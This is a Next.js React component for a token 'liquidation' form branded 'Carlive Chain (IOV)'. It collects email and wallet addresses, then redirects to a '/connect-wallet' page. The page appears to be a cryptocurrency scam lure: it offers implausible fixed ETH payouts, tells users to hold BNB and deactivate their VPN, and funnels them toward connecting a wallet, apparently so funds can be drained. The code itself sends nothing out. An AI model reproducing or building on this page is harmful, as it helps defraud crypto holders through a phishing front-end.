"use client";
import { useState } from "react";
import { redirect } from "next/navigation";
import { FormEvent } from "react";
import { toast } from "sonner";

//Import Icons
import { GoDotFill } from "react-icons/go";

const Form = () => {
  //State for redirecting
  const [isTrue, setIsTrue] = useState<boolean>(false);
  
  //On Submit Function
  const onSubmit = (e: FormEvent) => {
    e.preventDefault();
    toast.success(
      "Your Response Was Collected Successfully. You will be Redirected"
    );
    setIsTrue(true);
  };
  //Submits the form and redirects the person to the connect wallet page
  isTrue && redirect("/connect-wallet");
  //TODO: Add the required attribute to the needed form fields, and also check it via their states before submitting.
  return (
    <main>
      <div className="border-b border-slate-700">
        <div className="mt-10 px-4 sm:px-6 lg:px-8">
          <h1 className="text-lg sm:text-xl md:text-2xl lg:text-3xl font-bold">
            Carlive Chain Price
          </h1>
          <p className="text-xs sm:text-sm md:text-base mt-4 mb-8 text-slate-400">
            Live Carlive Chain (IOV) Price, Historical Chart & Carlive Chain
            Market Cap
          </p>
        </div>
      </div>

      <div className="mt-8 px-4 sm:px-6 lg:px-8">
        <h1 className="text-base sm:text-lg md:text-xl lg:text-2xl font-bold">
          Request For You IOV Token Liquidation
        </h1>
        <div className="mt-8 flex gap-x-1">
          <GoDotFill className="text-textBlue shrink-0" size={16} />
          <p className="font-semibold text-xs md:text-sm text-textBlue">
            You must have enough (BNB Smartchain) before you apply for
            Liquidation.
          </p>
        </div>
        <div className="mt-2 flex gap-x-1">
          <GoDotFill className="text-textBlue shrink-0" size={16} />
          <p className="font-semibold text-xs md:text-sm text-textBlue">
            Deactivate VPN and perform the payout on the same IP address.
          </p>
        </div>
      </div>
      <form className="mt-10 px-4 sm:px-6 lg:px-8" onSubmit={onSubmit}>
        <div className="flex flex-col gap-y-2">
          <label className="cursor-pointer" htmlFor="email">
            Email
          </label>
          <input
            type="email"
            name="email"
            id="email"
            className="bg-inherit w-full max-w-[40rem] border border-textLightBlue rounded-lg focus:outline-none p-3 placeholder:text-xs md:placeholder:text-md"
            placeholder="Enter Your Email Address"
          />
        </div>
        <div className="mt-4 flex flex-col gap-y-2 w-full max-w-[40rem]">
          <label className="cursor-pointer" htmlFor="claimAmount">
            Payout Quantity
          </label>
        <select name="claimAmount" id="claimAmount" className="bg-inherit border border-textLightBlue rounded-lg focus:outline-none p-3">
          <option value="25000000IOV/25ETH">25000000IOV/25ETH</option>
          <option value="50000000IOV/48ETH">50000000IOV/48ETH</option>
          <option value="75000000IOV/119ETH">75000000IOV/119ETH</option>
          <option value="1000000000IOV/396.98ETH">1000000000IOV/396.98ETH</option>
        </select>
  </div>
        <div className="flex flex-col gap-y-2 mt-4">
          <label className="cursor-pointer" htmlFor="iovWalletAddress">
            IOV Wallet Address
          </label>
          <input
            type="text"
            name="iovWalletAddress"
            id="iovWalletAddress"
            className="bg-inherit w-full max-w-[40rem] border border-textLightBlue rounded-lg focus:outline-none p-3 placeholder:text-xs md:placeholder:text-md"
            placeholder="Enter Your IOV Wallet Address"
          />
        </div>
        <div className="mt-4 flex flex-col gap-y-2 w-full max-w-[40rem]">
          <label className="cursor-pointer" htmlFor="wallet">
            IOV Claim Wallet
          </label>
          <select name="wallet" id="wallet" className="bg-inherit border border-textLightBlue rounded-lg focus:outline-none p-3">
            <option value="Trust Wallet">Trust Wallet</option>
            <option value="Metamask">Metamask</option>
            <option value="Atomic Wallet">Atomic Wallet</option>
          </select>
        </div>
        <div className="flex flex-col gap-y-2 mt-4">
          <label className="cursor-pointer" htmlFor="membershipCard">
            Royal Membership Card (Optional)
          </label>
          <input
            type="text"
            name="membershipCard"
            id="membershipCard"
            className="bg-inherit w-full max-w-[40rem] border border-textLightBlue rounded-lg focus:outline-none p-3 placeholder:text-xs md:placeholder:text-md"
            placeholder="Enter Your Royal Membership Card"
          />
        </div>
        <div className="flex flex-col gap-y-2 mt-4">
          <label className="cursor-pointer" htmlFor="ethereumAddress">
            Ethereum Address
          </label>
          <textarea
            name="ethereumAddress"
            id="ethereumAddress"
            className="resize-none bg-inherit w-full max-w-[40rem] border border-textLightBlue rounded-lg focus:outline-none p-3 placeholder:text-xs md:placeholder:text-md"
            placeholder="Enter Your Ethereum Address"
          />
        </div>
        <div className="mt-4 w-full max-w-[40rem]">
          <input
            type="submit"
            value="Next Step"
            className="bg-accentBlue text-center w-full py-3 border-2 font-bold border-accentBlue hover:bg-inherit duration-500 hover:text-accentBlue cursor-pointer rounded-lg"
          />
        </div>
      </form>
    </main>
  );
};

export default Form;
